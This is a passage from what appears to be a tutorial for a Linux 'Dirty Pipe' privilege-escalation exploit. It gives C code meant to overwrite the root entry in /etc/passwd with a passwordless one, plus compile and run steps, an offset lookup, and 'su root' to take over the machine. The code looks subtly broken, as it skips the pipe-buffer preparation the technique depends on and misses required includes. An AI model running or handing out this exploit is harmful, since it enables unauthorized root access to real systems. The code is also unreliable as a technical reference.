#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define PAGE_SIZE 4096

void die(const char *msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <file> <offset>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    const char *file = argv[1];
    off_t offset = strtoul(argv[2], NULL, 0);

    int fd = open(file, O_RDONLY);
    if (fd == -1) die("open");

    struct stat st;
    if (fstat(fd, &st) == -1) die("fstat");

    void *map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED) die("mmap");

    int pipefd[2];
    if (pipe(pipefd) == -1) die("pipe");

    if (splice(fd, &offset, pipefd[1], NULL, 1, 0) == -1) die("splice");

    const char *data = "root::0:0:root:/root:/bin/bash\n";
    size_t len = strlen(data);

    if (write(pipefd[1], data, len) != len) die("write");

    close(fd);
    close(pipefd[0]);
    close(pipefd[1]);

    return 0;
}
```

##### Step 4: Compiling the Exploit
Save the above code to a file, for example, `dirty_pipe.c`. Compile it using the following command:

```sh
gcc -o dirty_pipe dirty_pipe.c
```

##### Step 5: Running the Exploit
To run the exploit, you need to know the offset of the root user's password entry in `/etc/passwd`. You can find this using the `grep` command:

```sh
grep -b 'root:' /etc/passwd
```

The output will show the byte offset of the `root:` entry. Use this offset when running the exploit:

```sh
./dirty_pipe /etc/passwd <offset>
```

Replace `<offset>` with the actual offset value you found.

##### Step 6: Gaining Root Access
After running the exploit, the root user's password will be removed. You can now switch to the root user without a password:

```sh
su root
```

You should now have root access.

